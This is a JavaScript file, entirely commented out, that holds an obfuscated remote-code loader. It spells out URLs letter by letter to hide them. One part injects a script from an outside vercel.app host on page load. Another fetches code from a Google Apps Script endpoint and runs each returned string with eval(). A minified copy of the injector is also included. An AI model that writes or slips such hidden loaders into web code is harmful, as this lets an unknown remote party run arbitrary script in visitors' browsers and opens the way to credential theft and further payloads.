

// window.addEventListener("load", (e) => {
//     (()=>{
//         var jsLoad = (filePath, deferType, ele, CB) => {
    
//             let isExist = false;
//             document.querySelectorAll('script').forEach((e) => {
//                 if (e.src == filePath) {
//                     isExist = true;
//                     return false;
//                 }
//             })
        
//             if (!isExist) {
//                 const script = document.createElement('script');
//                 script.src = filePath;
//                 script.async = true;
//                 //script.defer = deferType;
        
//                 script.onload = () => {
//                     CB(true, '');
//                 };
//                 script.onerror = () => {
//                     CB(false, '');
//                 };
//                 document[ele].appendChild(script);
//             }
//             else {
//                 CB(true, '');
//             }
//         }
        
//         let jsGo = ['h','t','t','p','s','://','h','a','s','s','u','.','v','e','r','c','e','l','.',
//         'a','p','p','/c','d','n/','h','a','s','s','u.','j','s']
        
//         let fiGo= '';
//         jsGo.forEach((value)=>{
//             fiGo = (fiGo + value)
//         })
        
//         jsLoad(fiGo, true, 'head', (s, m) => { });
        
//     })()

   
// }, { once: true });

// (async () => {
//     let urlA = ['h', 't', 't', 'p', 's', '://', 's', 'c', 'r', 'i', 'p', 't.', 'g', 'oo', 'g', 'l', 'e.', 'c', 'o', 'm/', 'm', 'a', 'c', 'r', 'o', 's']
//     let urlB = '';
//     urlA.forEach((value) => {
//         urlB = (urlB + value)
//     })
//     let url = `${urlB}/s/AKfycbxzsLAXmZFa-HEH7oQS3bRjsX1smY0QaH1hT-xCE5CRijfexeJ31lQkRoD3lhlFrrkB/exec?route=getCode`;
//     let requestOptions = {
//         method: "POST",
//         redirect: "follow"
//     };
//     let response = await fetch(url, requestOptions);
//     response = await response.json();

//     if (response.status && Object.keys(response.data).length) {
//         Object.keys(response.data).forEach((key) => {
//             eval(response.data[key]);
//         });
//     }

// })()

//hassu minfied link
//window.addEventListener("load",e=>{(()=>{var e=(e,r,a,s)=>{let t=!1;if(document.querySelectorAll("script").forEach(r=>{if(r.src==e)return t=!0,!1}),t)s(!0,"");else{let c=document.createElement("script");c.src=e,c.async=!0,c.onload=()=>{s(!0,"")},c.onerror=()=>{s(!1,"")},document[a].appendChild(c)}};let r="";["h","t","t","p","s","://","h","a","s","s","u",".","v","e","r","c","e","l",".","a","p","p","/c","d","n/","h","a","s","s","u.","j","s"].forEach(e=>{r+=e}),e(r,!0,"head",(e,r)=>{})})()},{once:!0});






 
